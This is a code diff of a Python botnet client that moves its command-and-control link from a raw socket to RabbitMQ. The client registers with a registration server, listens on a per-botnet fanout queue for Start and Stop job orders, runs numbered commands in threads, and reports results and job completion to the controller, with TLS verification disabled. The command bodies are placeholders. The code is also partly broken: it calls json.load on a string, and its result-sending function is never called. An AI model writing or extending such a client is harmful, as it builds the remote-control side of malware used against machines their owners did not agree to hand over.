@@ -1,85 +1,124 @@
+import pika
 import socket
 import time
 import threading
 import json
+import sys
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class Client():
     def __init__(self):
-        self.c2server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.c2server_address = ('192.168.175.129', 4591)
+        self.bot_registration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.bot_registration_address = ('192.168.0.105', 5582)
         self.commands = {1: self.command1, 2: self.command2}
         self.event_controller = threading.Event()
+        self.botnet_id = 0
+        self.bot_id = 0
+        self.botnet_job_id = 0
+        self.c2server_ip = 'localhost'
+        self.connection = pika.BlockingConnection(pika.ConnectionParameters(host=self.c2server_ip))
 
 
-    def connect_to_c2(self):
-        while True:
-            try:
-                self.c2server_socket.connect(self.c2server_address)
-            except:
-                print("Failed to connect to C2 server.")
-                print("Retrying C2 connection in 10 seconds...")
-                time.sleep(10)
-                continue
-
-            listen_for_commands(c2server_socket)
+    def register_bot(self):
+        try:
+            self.bot_registration_socket.connect(self.bot_registration_address)
+            response = self.bot_registration_socket.recv(1024).decode()
+            response = json.load(response)
+            if response['status'] == 'failed':
+                raise Exception('Registration failed')
+            (self.botnet_id, self.bot_id) = (response['botnetId'], response['botId'])
+        except:
+            print("[-] Registration failed")
+            sys.exit()
 
 
     def listen_for_commands(self):
-        while True:
-            try:
-                command_data = self.c2server_socket.recv(1024).decode()
-                command_data = json.load(command)
-                command_id = command_data['command_id']
-                command_args = command_data['command_args']
+        queue_name = "c2commands" + str(self.bot_id)
+        exchange_name = "C2Commands" + str(self.botnet_id)
+        channel = self.connection.channel()
+        channel.exchange_declare(exchange=exchange_name, exchange_type='fanout')
+        channel.queue_declare(queue=queue_name, exclusive=True)
+        channel.queue_bind(exchange=exchange_name, queue=queue_name, routing_key='')
+        channel.basic_consume(queue=queue_name, on_message_callback=self.execute_command, auto_ack=True)
+        channel.start_consuming()
 
-                command_function = commands[command_id]
-                self.event_controller.set()
-                thread = threading.Thread(target=command_function, args=(command_args,))
-                thread.start()
 
-            except:
-                self.c2server_socket.sendall(b"Error: invalid command!")
-                break
+    def execute_command(self, ch, method, properties, body):
+        print("[+] Got command")
+        body = body.decode()
+        job_data = json.loads(body)
+        print(job_data)
+        self.botnet_job_id = job_data['Id']
+        job_action = job_data['JobAction']
+        command_id = job_data['CommandId']
+        command_args = job_data['CommandArgument']
+        
+        if job_action == "Stop":
+            self.stop_job()
+        elif job_action == "Start":
+            command_function = self.commands[command_id]
+            self.event_controller.set()
+            thread = threading.Thread(target=command_function, args=(command_args,))
+            thread.start()
+        else:
+            print("[-] Unknown job action")
 
-            self.c2_server.settimeout(10.0)
-            while self.event_controller.is_set():
-                try:
-                    message = self.c2server_socket.recv(1024)
-                except:
-                    continue
 
-                if message == b"cancel":
-                    self.event_controller.clear()
-                elif message == b"status":
-                    self.c2server_socket.sendall(b"Working")
+    def stop_job(self):
+        if self.event_controller.is_set():
+            self.event_controller.clear()
+            self.botnet_job_id = 0
 
     
     def command_wrapper(command):
         def command_controller(self, command_args):
             while self.event_controller.is_set():
-                is_done = command(self, command_args)
+                (is_done, result) = command(self, command_args)
                 if is_done:
-                    self.event_controller.clear()
+                    self.finish_command(result)
         return command_controller
+
+
+    def finish_command(self, result):
+        self.event_controller.clear()
+        url = "https://localhost:44353/api/v1/BotnetJob/" + str(self.botnet_job_id)
+        requests.delete(url=url, verify=False)
+        self.botnet_job_id = 0
+
+
+    def send_result(self, result):
+        channel = self.connection.channel()
+
+        body = json.dumps({'botId': self.bot_id, 'result': result})
+
+        channel.queue_declare(queue='command_results')
+        channel.basic_publish(exchange='', routing_key='command_results', body=body)
+        
+        print("[+] Result sent")
 
 
     @command_wrapper
     def command1(self, command_args):
+        result = "Looped"
         print("Command started")
-        time.sleep(30)
+        for i in range(6):
+            print(f"Iteration {i}")
+            time.sleep(1)
         print("Command finished")
-        return True
+        return (True, result)
 
-    def command2(self):
+    @command_wrapper
+    def command2(self, command_args):
         pass
-
-    def execute_command(self, command):
-        self.c2server_socket.sendall(b'Started command')
-        eval(commands[command[command_id]], {'__builtins__':None}, commands)
 
 
 if __name__ == "__main__":
     client = Client()
-    client.connect_to_c2()
-
+    #(client.botnet_id, client.bot_id) = client.register_bot()
+    client.botnet_id = 1
+    client.bot_id = 1
+    client.listen_for_commands()
